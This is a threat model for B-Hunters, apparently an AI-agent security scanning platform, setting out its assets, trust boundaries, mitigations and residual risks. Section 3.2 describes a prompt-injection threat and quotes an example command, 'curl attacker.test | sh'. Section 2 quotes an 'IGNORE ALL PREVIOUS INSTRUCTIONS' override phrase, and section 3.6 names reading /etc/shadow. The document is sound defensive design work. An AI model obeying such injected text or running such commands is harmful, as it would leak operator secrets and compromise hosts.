# B-Hunters threat model

This document describes what could go wrong when B-Hunters is used against
a real target, what the platform does about it, and — just as important —
what the platform explicitly does **not** protect against.

The scope of the threat model is the platform itself: the API, the web UI,
the agent runtime, the tool gateway, the workers and the deployment. It
does not attempt to model the vulnerabilities in the scanner tools
themselves (nuclei, sqlmap and friends have their own threat models).

---

## 1. Assets

| Asset | Why it matters |
|---|---|
| Authorised scope definition | Getting it wrong turns an authorised assessment into an unauthorised one |
| Model provider credentials | Leakage allows model abuse and cost exhaustion |
| Session cookies and CSRF tokens | Leakage allows an attacker to act as an operator |
| Discovered credentials | These are the highest-value output of the whole system |
| Scan artefacts and findings | May contain personal data or exploitable detail |
| Agent workspaces | Contain intermediate analysis, possibly including source code |
| Audit log | The evidence of who did what |
| The vulnerable laboratory | Deliberately vulnerable software on the host network |

---

## 2. Trust boundaries

```
 ┌────────────────────────────────────────────────────────────┐
 │ Operator workstation (untrusted browser)                    │
 └───────────────────────────┬────────────────────────────────┘
                             │ HTTPS + session cookie + CSRF
 ┌───────────────────────────▼────────────────────────────────┐
 │ B-Hunters API  (trusted)                                   │
 │   ├── session store (MongoDB)                              │
 │   └── scope enforcement  ◄── the central control            │
 └───────────────────────────┬────────────────────────────────┘
                             │ Karton task
 ┌───────────────────────────▼────────────────────────────────┐
 │ Karton workers  (semi-trusted: they hold target data)      │
 └───────────────────────────┬────────────────────────────────┘
                             │
 ┌───────────────────────────▼────────────────────────────────┐
 │ Agent runtime  ◄── model output is UNTRUSTED DATA          │
 │   └── tool gateway (permissions, scope, sandbox)            │
 └───────────────────────────┬────────────────────────────────┘
                             │ outbound HTTP
 ┌───────────────────────────▼────────────────────────────────┐
 │ Target (untrusted) ── content is DATA, never instructions   │
 └────────────────────────────────────────────────────────────┘
```

**The two boundaries that matter most:**

1. **Target → agent.** Everything read from the target is data. A page
   that says *"IGNORE ALL PREVIOUS INSTRUCTIONS"* is a finding, not a
   command.
2. **Model → tool.** The model's request for a tool call is a *request*,
   not a decision. The gateway decides.

---

## 3. Threats and mitigations

### 3.1 Scope escape — the highest severity

**Threat.** A scan of `example.com` follows a crawled link to
`internal.corp.example.com`, a redirect leads to `169.254.169.254`, or a
DNS record flips to `127.0.0.1` between validation and connection.

**Mitigations** (`b_hunters/platform/security/scope.py`):

* The authorised host list is fixed when the scan is created. A host
  discovered during crawling is **never** added to it.
* `*.example.com` matches subdomains only; the apex must be listed
  explicitly. This prevents a wildcard from silently widening the scope.
* Every resolved IP address is validated, not just the hostname. A host
  that resolves to both a public and a private address is refused
  outright.
* Loopback, RFC 1918, link-local (including `169.254.169.254`), CGNAT,
  multicast, reserved and IPv6 equivalents are blocked. `allow_private_network`
  exists only for the isolated laboratory and is off by default.
* Redirects are validated hop by hop; a redirect may never leave the
  scope. The chain length is bounded.
* Non-safe HTTP methods require an explicit policy flag.
* Excluded paths are refused.

**Residual risk.** The platform validates destinations, not the *intent*
of a request. A GET to an in-scope admin endpoint that deletes data
because the application is badly designed is outside the platform's
control — which is why `safe_mode` and `allow_state_changing` exist.

### 3.2 Prompt injection through target content

**Threat.** A scanned page contains text crafted to make the agent
exfiltrate the session cookie, run a shell command, disable the scope
policy, or mark an unverified finding as confirmed.

**Mitigations:**

* The operating policy (`b_hunters/platform/agents/roles.py`) states in
  every role prompt that target content is data. It is prepended to the
  role's own instructions, so it cannot be displaced by role content.
* The **tool gateway** enforces scope, permissions, workspace boundaries
  and timeouts regardless of what the model asked for. An injected
  instruction to "run `curl attacker.test | sh`" cannot grant the shell
  capability.
* The shell policy is an allow-list of programs plus a deny-list of
  destructive substrings, and commands run inside the agent's own
  workspace with a scrubbed environment.
* The `allow_private_network` and `allow_state_changing` flags are scan
  configuration, not something a model can set.
* Findings proposed by agents default to `unverified`. Only the
  verification agent can move a finding to `confirmed`, and it does so
  from evidence.

**Residual risk.** An injected instruction could still influence the
*narrative* of a finding. The mitigation is that severity and
verification are decided by the verifier and adjudicator from evidence, and
that the full reasoning summary is visible to the operator.

### 3.3 Credential leakage

**Threat.** A hardcoded secret in a JavaScript bundle ends up in the
model's context, in the logs, in a tool-call record or in a report.

**Mitigations:**

* `b_hunters/platform/security/redact.py` redacts authorization headers,
  cookies, known token shapes (AWS, GitHub, Slack, Stripe, Google, JWT),
  private key blocks, sensitive JSON keys and sensitive query parameters.
* Redaction is applied **at the tool gateway boundary**, so it applies to
  every tool regardless of whether that tool redacts its own output.
* The JavaScript analyser reports the *location* and *type* of a
  credential candidate, never the value. It separates public configuration
  (API base URLs, build identifiers) from actual credentials by both key
  name and value shape.
* The provider status object redacts the API key before it is returned to
  the UI.
* The audit log records the action and the target, never a payload
  containing a secret.

**Residual risk.** A credential in an unusual format that matches none of
the known shapes could be reported verbatim. The JavaScript analyser's
"public configuration versus credential" classification reduces the
blast radius but does not eliminate it. Operators should treat the
findings database as sensitive.

### 3.4 Unauthorised access to the platform

**Threat.** An unauthenticated user reads scan results, creates scans
against a target of their choosing, or takes over an administrator
account.

**Mitigations:**

* Every API route except `/auth/login` and the static assets requires a
  session; the dependency raises `401` before the handler runs.
* Passwords are hashed with **argon2id** (64 MiB, 3 iterations, 2 lanes).
  Verification is constant-time and a dummy hash is used for unknown
  users so that "no such user" and "wrong password" take comparable time.
* Sessions are server-side records. The cookie holds an opaque 256-bit
  identifier and only its SHA-256 hash is stored, so a database leak does
  not yield usable cookies.
* The session cookie is `HttpOnly`, `SameSite=Lax` and `Secure` when the
  deployment is configured for TLS.
* CSRF protection uses the double-submit pattern: a readable cookie must
  be echoed in the `X-CSRF-Token` header on every unsafe method.
* Three roles — `admin`, `operator`, `viewer` — are enforced
  server-side on every protected route.
* Login attempts are throttled per username and per IP address.
* The password change endpoint requires the current password and
  invalidates every other session.
* Authentication and administrative actions are written to the audit log.

**Residual risk.** There is no multi-factor authentication and no
account lockout that survives a restart (the throttle is in-process). A
deployment with more than one API node should move the throttle counters
into the database.

### 3.5 Denial of service against the platform or the target

**Threat.** A scan floods the target, exhausts the agent budget, or a
looping agent burns the provider's token allowance.

**Mitigations:**

* Request rate limiting per host (token bucket), a concurrency limit, a
  response-size limit and an absolute scan-duration budget are all
  enforced by the scope enforcer.
* The agent loop is bounded four ways: rounds, tool calls, tokens and wall
  clock. Each is reported independently.
* A repeated identical tool call is refused after the second attempt, and
  the agent is told to change approach.
* Delegation depth is bounded and circular delegation is refused.
* The collaboration protocol settles a disagreement as *inconclusive*
  after a bounded number of challenge rounds rather than letting two
  agents argue indefinitely.
* Response payloads are truncated before they reach the model.

**Residual risk.** The in-process login throttle is not shared between
nodes. A distributed deployment should back it with the database.

### 3.6 Prompt-driven file-system escape

**Threat.** The model asks the agent to read `/etc/shadow` or write to
`/usr/bin`.

**Mitigations.** `resolve_workspace_path` rejects absolute paths and any
path containing `..` that would escape the assigned workspace. Each agent
gets its own workspace directory. Write permission is a separate
capability that most roles do not hold.

### 3.7 Worker-to-worker contamination

**Threat.** A tool's output — a crafted file name, a hostile HTTP header —
is interpreted as markup by the UI, or is executed by another component.

**Mitigations.** The frontend escapes every value that reaches the DOM
(`escape()` in `b_hunters/web/app.js`) — no target-derived string is ever
inserted as HTML. Tool output is stored as data, never evaluated. The
JavaScript analyser never executes the content it analyses.

### 3.8 Laboratory exposure

**Threat.** The deliberately vulnerable applications become reachable from
an untrusted network.

**Mitigations.** The laboratory is a separate Docker Compose project on
its own bridge network, and every published port is bound to
`127.0.0.1`. The laboratory is never started automatically; an
administrator must run `b-hunters bench lab up` explicitly. Benchmarks
run with `allow_private_network` enabled, and that flag is set only by the
benchmark runner, never by the API.

---

## 4. Threats that are explicitly out of scope

| Threat | Why it is out of scope |
|---|---|
| A malicious scanner tool | The tools are third-party code executed in their own containers; the platform does not sandbox them from each other. Treat a compromised tool as a compromised host. |
| A compromised Docker daemon or host kernel | The platform runs inside that trust boundary. |
| Physical access to the host | Out of scope for any application-level control. |
| The target attacking the platform host directly | The platform deliberately makes outbound requests. Network egress policy (see §6) is the control. |
| A malicious or negligent operator with valid credentials | The platform records actions in the audit log; it does not prevent an administrator from doing damage. |

---

## 5. Deployment requirements that follow from this model

1. Run the API behind TLS and set `BHUNTERS_SESSION_COOKIE_SECURE=true`.
2. Keep MongoDB, Redis and MinIO on the internal network only. The
   playground Compose file publishes them on all interfaces — that is a
   development convenience, not a production configuration.
3. Do not set the artefact bucket policy to `public`.
4. Set `BHUNTERS_BOOTSTRAP_PASSWORD` or use the interactive prompt; there
   is no default credential.
5. Restrict container egress to the approved target set at the network
   layer. The platform's scope enforcement is application-level; a
   network policy is the second layer.
6. Give agent workers read-only access to the source tree and write access
   only to the agent workspace.
7. Rotate the provider API key and the database credentials on a schedule,
   and keep them in a secret store rather than in the environment of a
   long-lived process.

---

## 6. Defence in depth: the layers

| Layer | Control | Enforced in |
|---|---|---|
| 1. Authorisation | Operator grants a fixed host allow-list | `api/routers/scans.py` |
| 2. Destination validation | Host, port, path, scheme, method | `security/scope.py` |
| 3. Address validation | Every resolved IP checked against blocked ranges | `security/scope.py` |
| 4. Redirect validation | Each hop re-checked | `tools/builtin/http.py` |
| 5. Rate and size limits | Token bucket, concurrency, response size | `security/scope.py` |
| 6. Capability model | Per-role capabilities and tool allow-lists | `tools/gateway.py` |
| 7. Workspace isolation | Absolute paths and traversals refused | `tools/gateway.py` |
| 8. Command policy | Program allow-list and destructive deny-list | `tools/builtin/shell.py` |
| 9. Secret redaction | Applied at the tool boundary | `security/redact.py` |
| 10. Verification | Findings stay unverified until reproduced | `agents/orchestrator.py` |
| 11. Audit | Every privileged action recorded | `db/repositories.py` |
| 12. Network policy | Container egress restrictions | deployment, outside the application |

No single layer is trusted on its own. The scope check, for example, is
repeated in the scope enforcer, in the tool gateway and in the native
adapters, because a single check in the wrong place is a single point of
failure.
